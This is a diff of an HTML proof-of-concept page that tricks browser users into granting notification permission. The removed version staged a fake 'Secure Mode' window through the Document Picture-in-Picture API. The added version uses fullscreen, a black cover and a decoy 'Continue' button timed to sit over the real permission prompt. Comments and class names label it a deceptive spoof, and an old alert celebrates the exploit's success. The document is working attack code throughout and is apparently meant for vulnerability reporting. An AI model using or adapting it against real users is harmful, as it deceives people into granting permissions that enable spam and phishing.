@@ -1,82 +1,74 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PiP Spoof Notification</title>
+  <title>Secure Video</title>
   <style>
-    body {
-      font-family: sans-serif;
-      padding: 40px;
-      background: #f4f4f4;
-    }
-    #start {
-      padding: 15px 30px;
-      font-size: 18px;
-      background: #1a73e8;
+    body, html {
+      margin: 0;
+      padding: 0;
+      background: black;
       color: white;
+      font-family: Arial, sans-serif;
+    }
+    #container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    .deceptive-btn {
+      padding: 16px 32px;
+      font-size: 18px;
       border: none;
-      border-radius: 8px;
+      background: #00cc99;
+      color: white;
+      border-radius: 6px;
       cursor: pointer;
+      z-index: 9999;
+    }
+    #cover {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: black;
+      z-index: 9998;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
     }
   </style>
 </head>
 <body>
-  <h2>Watch Secure Video</h2>
-  <p>This video is protected. Click below to begin.</p>
-  <button id="start">▶️ Play Video</button>
+  <div id="container">
+    <h1>🔒 Watch Secure Video</h1>
+    <button class="deceptive-btn" onclick="startSpoof()">Start Secure Session</button>
+  </div>
+
+  <div id="cover">
+    <h2>Loading...</h2>
+    <button class="deceptive-btn">Continue</button>
+  </div>
 
   <script>
-    async function runPoC() {
-      if (!('documentPictureInPicture' in window)) {
-        alert('documentPictureInPicture not supported');
-        return;
-      }
+    function startSpoof() {
+      const cover = document.getElementById('cover');
+      document.documentElement.requestFullscreen().then(() => {
+        setTimeout(() => {
+          cover.style.display = 'flex';
 
-      const pipWin = await documentPictureInPicture.requestWindow();
-
-      pipWin.document.body.innerHTML = `
-        <style>
-          body {
-            margin: 0;
-            font-family: sans-serif;
-            background: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            flex-direction: column;
-          }
-          button {
-            padding: 10px 20px;
-            font-size: 16px;
-            border: none;
-            background: #34a853;
-            color: white;
-            border-radius: 6px;
-            cursor: pointer;
-          }
-        </style>
-        <h1>🔒 Secure Mode</h1>
-        <p>This mode is protected. Click continue to proceed.</p>
-        <button id="go">Continue</button>
-      `;
-
-      // Intercept user click inside PiP
-      pipWin.document.getElementById('go').addEventListener('click', () => {
-        // Deceptively triggers Notification permission
-        Notification.requestPermission().then(result => {
-          pipWin.alert("✅ Secure Mode Confirmed"); // Fake feedback
-        });
+          // Trigger the real notification permission prompt underneath deceptive button
+          setTimeout(() => {
+            Notification.requestPermission().then(res => {
+              alert("User chose: " + res);
+            });
+          }, 100); // Delay triggers while user clicks Continue
+        }, 500);
       });
     }
-
-    document.getElementById('start').onclick = runPoC;
-
-    Notification.requestPermission().then(status => {
-  if (status === 'granted') {
-    alert("🎯 Exploit berhasil: Notification permission diizinkan!");
-  }
-});
-
   </script>
 </body>
 </html>
